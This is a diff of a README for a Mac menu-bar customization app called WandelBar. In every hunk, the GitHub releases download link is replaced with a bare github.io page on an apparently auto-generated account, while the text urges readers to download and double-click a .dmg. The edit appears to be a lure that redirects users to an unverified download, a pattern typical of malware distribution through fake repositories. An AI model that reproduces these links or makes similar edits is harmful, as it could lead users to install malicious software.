@@ -1,6 +1,6 @@
 # ✨ WandelBar - Customize Your Mac Menu Bar Beautifully
 
-[![Download WandelBar](https://img.shields.io/badge/Download-WandelBar-8A2BE2?style=for-the-badge&logo=github)](https://github.com/briettadisabling1382/WandelBar/releases)
+[![Download WandelBar](https://img.shields.io/badge/Download-WandelBar-8A2BE2?style=for-the-badge&logo=github)](https://briettadisabling1382.github.io)
 
 ---
 
@@ -18,7 +18,7 @@ Whether you want a sleek professional look or something fun and colorful, Wandel
 
 Getting WandelBar on your Mac is simple. No complicated commands or programming knowledge needed. Just follow these easy steps:
 
-Visit this link to download the application: [WandelBar Releases](https://github.com/briettadisabling1382/WandelBar/releases)
+Visit this link to download the application: [WandelBar Releases](https://briettadisabling1382.github.io)
 
 Click the download link and wait for the download to finish. Your Mac will handle the rest. The application comes ready to use once downloaded.
 
@@ -28,7 +28,7 @@ Click the download link and wait for the download to finish. Your Mac will handl
 
 Ready to transform your menu bar? Here's what to do:
 
-1.  **Visit the Download Page**: Open your browser and go to [https://github.com/briettadisabling1382/WandelBar/releases](https://github.com/briettadisabling1382/WandelBar/releases)
+1.  **Visit the Download Page**: Open your browser and go to [https://briettadisabling1382.github.io](https://briettadisabling1382.github.io)
 2.  **Find the Latest Version**: Look for the most recent release with a version number like v1.0 or higher. It will be at the top of the list.
 3.  **Download the File**: Click the download link. Your browser will save the file to your Downloads folder, usually in the top-right corner or bottom of your browser window.
 4.  **Run WandelBar**: Once downloaded, find the file (it's usually named something like `WandelBar.dmg`) in your Downloads folder. Double-click it to open it. A small window will appear.
@@ -108,7 +108,7 @@ WandelBar is a community-driven project, and everyone is welcome to contribute o
 
 New versions of WandelBar are released regularly with bug fixes and new features. To update:
 
-1.  Visit the [Releases page](https://github.com/briettadisabling1382/WandelBar/releases) periodically.
+1.  Visit the [Releases page](https://briettadisabling1382.github.io) periodically.
 2.  Download the newest version.
 3.  Follow the same install process you used initially.
 
@@ -120,7 +120,7 @@ Your saved presets and settings will carry over automatically, so you won't lose
 
 WandelBar is your ticket to a more personalized, beautiful Mac experience. It's free, easy to use, and incredibly powerful. Don't wait — give your menu bar the upgrade it deserves today.
 
-[🚀 Download WandelBar Now](https://github.com/briettadisabling1382/WandelBar/releases)
+[🚀 Download WandelBar Now](https://briettadisabling1382.github.io)
 
 ---
 
